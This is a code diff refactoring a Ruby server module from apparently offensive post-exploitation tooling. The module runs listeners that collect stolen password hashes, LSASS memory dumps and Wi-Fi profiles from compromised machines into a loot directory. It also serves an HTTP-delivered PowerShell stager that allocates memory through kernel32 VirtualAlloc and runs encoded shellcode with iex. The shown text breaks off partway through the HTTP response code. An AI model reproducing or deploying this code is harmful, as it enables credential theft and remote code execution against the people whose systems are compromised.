@@ -1,7 +1,8 @@
 #!/usr/bin/env ruby
 require 'socket'
-require_relative 'core'
-include Core
+require 'openssl'
+require 'core'
+include Core::Commands
 module Server
   class Setup
     def ssl(host, port)
@@ -14,42 +15,45 @@ module Server
       server
     end
 
+    def use_ssl?
+      ssl = rgets('Use ssl? ',  't')
+      ssl.downcase[0] == 't' ? true : false
+    end
+
     def host
       host_name = rgets('Enter the host ip/url to listen on: ', 'localhost')
-      print_success("Using #{host_name} as server\n")
+      print_success("Using #{host_name} as server")
       host_name
     end
 
     def port
       port = rgets('Enter the port you would like to use[443]: ', 443)
-      if port == ''
-        port = '443'
-        print_success("Using #{port}\n")
-        return port
-      elsif not (1..65535).cover?(port.to_i)
-        print_error("Not a valid port\n")
+      until (1..65_535).cover?(port.to_i)
+        print_error('Not a valid port')
         sleep(1)
-        port
-      else
-        print_success("Using #{port}\n")
-        return port
       end
+      print_success("Using #{port}")
+      port
     end
   end
 
   class Start
-    def hash_server(port, ssl = nil, host = nil)
+    include Core::Files
+    def initialize(ssl, host, port)
       Dir.mkdir(loot_dir) unless Dir.exist?(loot_dir)
-      x = 0
       if ssl
         print_info("Starting SSL Server!\n")
-        server = ssl_setup(host, port.to_i)
+        @server = Server::Setup.new.ssl(host, port.to_i)
       else
         print_info("Starting Server!\n")
-        server = TCPServer.open(port.to_i)
+        @server = TCPServer.open(port.to_i)
       end
+    end
+
+    def hash
+      x = 0
       loop do
-        Thread.start(server.accept) do |client|
+        Thread.start(@server.accept) do |client|
           print_info("Client Connected.\n")
           file_name = client.gets
           print_success("Got #{file_name.strip} file!\n")
@@ -71,18 +75,10 @@ module Server
       print_error(error)
     end
 
-    def lsass_server(port, ssl = nil,host = nil)
-      Dir.mkdir(loot_dir) unless Dir.exist?(loot_dir)
+    def lsass
       x = 0
-      if ssl
-        print_info("Starting SSL Server!\n")
-        server = ssl_setup(host, port.to_i)
-      else
-        print_info("Starting Server!\n")
-        server = TCPServer.open(port.to_i)
-      end
       loop do
-        Thread.start(server.accept) do |client|
+        Thread.start(@server.accept) do |client|
           print_info("Client Connected.\n")
           file_name = client.gets
           print_success("Got #{file_name.strip} file!\n")
@@ -100,33 +96,25 @@ module Server
       print_error(error)
     end
 
-    def wifi_server(port, ssl = nil, host = nil)
-      Dir.mkdir(loot_dir) unless Dir.exist?(loot_dir)
-      if ssl
-        print_info("Starting SSL Server!\n")
-        server = ssl_setup(host, port.to_i)
-      else
-        print_info("Starting Server!\n")
-        server = TCPServer.open(port.to_i)
-      end
+    def wifi
       loop do
-        Thread.start(server.accept) do |client|
+        Thread.start(@server.accept) do |client|
           file_name = client.gets
-          print_success("Got #{file_name.strip} file!\n")
-          print_info("Getting Data\n")
+          print_success("Got #{file_name.strip} file!")
+          print_info('Getting Data')
           out_put = client.gets
-          print_info("Writing to File\n")
+          print_info('Writing to File')
           File.open("#{loot_dir}#{file_name.strip}.xml", 'w') do |f|
             f.write(Base64.decode64(out_put))
           end
-          print_success("File Done!\n")
+          print_success('File Done!')
         end
       end
     rescue => error
       print_error(error)
     end
-    def web_server
-      print_info("Checking for Apache\n")
+    def web
+      print_info('Checking for Apache')
       sleep(2)
       if File.exist?('/usr/sbin/apache2')
         if File.exist?('/usr/sbin/service')
@@ -147,41 +135,34 @@ module Server
         exit
       end
       if @systemd_check =~ /inactive/ || @service_check =~ /NOT running/
-        print_info("Starting Server\n")
+        print_info('Starting Server')
         if File.exist?('/usr/bin/systemctl')
           out_put = `systemctl start httpd 2>&1`
           if out_put =~ /Access denied/
-            print_error("Access Denied, Not Running as Root\n")
+            print_error('Access Denied, Not Running as Root')
             exit
           else
-            print_success("Server Started!\n")
+            print_success('Server Started!')
             sleep(2)
           end
         elsif File.exist?('/usr/sbin/service')
           `service apache2 start`
-          print_success("Server Started!\n")
+          print_success('Server Started!')
           sleep(2)
         else
-          print_error("Could Not Start Apache!\n")
+          print_error('Could Not Start Apache!')
           exit
         end
       elsif @systemd_check =~ /active/ || @service_check =~ /running/
-        print_info("Server Already Running!\n")
+        print_info('Server Already Running!')
         sleep(2)
       end
     rescue => error
       print_error("#{error}\n")
       exit
     end
-    def ruby_web_server(port, ssl = nil, host, shellcode)
+    def ruby_web(shellcode)
       time = Time.now.localtime.strftime('%a %d %b %Y %H:%M:%S %Z')
-      if ssl
-        print_info('Starting SSL Server!')
-        server = ssl_setup(host, port.to_i)
-      else
-        print_info('Starting Server!')
-        server = TCPServer.open(host, port.to_i)
-      end
       s = %($1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr )
       s << 'VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, '
       s << "uint flProtect);[DllImport(\"kernel32.dll\")]public static extern "
@@ -201,7 +182,7 @@ module Server
       s << %(-noni -enc";iex "& $x86 $cmd $gq"}else{$cmd = "-nop -noni -enc";)
       s << %(iex "& powershell $cmd $gq";})
       loop do
-        Thread.start(server.accept) do |client|
+        Thread.start(@server.accept) do |client|
           print_info("Client Connected!\n")
           headers = ['HTTP/1.1 200 OK',
                      "Date: #{time}",
